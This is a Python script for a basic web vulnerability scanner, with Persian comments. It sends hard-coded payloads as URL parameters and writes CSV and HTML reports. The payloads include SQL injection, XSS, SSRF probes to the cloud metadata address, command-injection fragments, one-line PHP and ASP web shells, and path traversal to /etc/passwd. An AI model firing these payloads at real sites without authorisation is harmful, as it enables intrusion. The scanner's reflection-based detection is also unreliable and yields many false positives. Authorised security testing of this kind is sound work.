import requests
from bs4 import BeautifulSoup
import re
import sys
import csv

class VulnerabilityScanner:
    def __init__(self, urls_file):
        self.urls_file = urls_file
        self.vulnerabilities = []

        # لیست پیلودهای پایه + حرفه‌ای
        self.payloads = {
            "SQLi": [
                "' OR '1'='1 -- ",
                "' UNION SELECT NULL,@@version -- ",
                "' AND SLEEP(5) -- ",
            ],
            "XSS": [
                "<script>alert(1)</script>",
                "\"'><img src=x onerror=alert(1)>",
            ],
            "SSRF": [
                "http://127.0.0.1:80",
                "http://169.254.169.254/latest/meta-data/",
            ],
            "RCE": [
                ";id",
                "&& whoami",
            ],
            "File Upload": [
                "<?php system($_GET['cmd']); ?>",
                "<% exec request('cmd') %>",
            ],
            "Path Traversal": [
                "../../etc/passwd",
                "../../../../windows/win.ini",
            ],
            "IDOR": [
                "?user_id=1",
                "?account=123",
            ],
            "Broken Access Control": [
                "/admin",
                "/dashboard",
            ],
        }

    def load_urls(self):
        with open(self.urls_file, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]

    def scan_url(self, url):
        print(f"[Scanning] {url}")
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                soup = BeautifulSoup(r.text, "html.parser")
                forms = soup.find_all("form")

                # تست پیلود روی پارامترهای URL
                for vuln_type, payloads in self.payloads.items():
                    for payload in payloads:
                        test_url = url
                        if "?" in url:
                            test_url = url + "&test=" + payload
                        else:
                            test_url = url + "?test=" + payload

                        try:
                            resp = requests.get(test_url, timeout=5)
                            if any(p in resp.text for p in [payload, "root:", "alert(1)", "syntax error", "SQL", "ORA-", "Command not found"]):
                                self.vulnerabilities.append({
                                    "url": test_url,
                                    "type": vuln_type,
                                    "payload": payload
                                })
                                print(f"   [VULNERABILITY FOUND] {vuln_type} -> {test_url}")
                        except Exception:
                            continue

        except Exception as e:
            print(f"   [ERROR] {url} -> {e}")

    def save_csv(self):
        with open("report.csv", "w", newline="", encoding="utf-8") as csvfile:
            fieldnames = ["type", "url", "payload"]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for vuln in self.vulnerabilities:
                writer.writerow(vuln)

    def save_html(self):
        with open("report.html", "w", encoding="utf-8") as f:
            f.write("<html><head><title>Scan Report</title></head><body>")
            f.write("<h1>Security Scan Report</h1>")
            f.write("<table border='1' style='border-collapse:collapse;width:100%'>")
            f.write("<tr><th>Type</th><th>URL</th><th>Payload</th></tr>")
            for vuln in self.vulnerabilities:
                f.write(f"<tr><td>{vuln['type']}</td><td>{vuln['url']}</td><td>{vuln['payload']}</td></tr>")
            f.write("</table></body></html>")

    def run(self):
        urls = self.load_urls()
        for url in urls:
            self.scan_url(url)

        print(f"\nScan Complete! Total Vulnerabilities: {len(self.vulnerabilities)}")
        self.save_csv()
        self.save_html()
        print("Reports saved as report.csv and report.html")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python scanner.py urls.txt")
        sys.exit(1)

    scanner = VulnerabilityScanner(sys.argv[1])
    scanner.run()
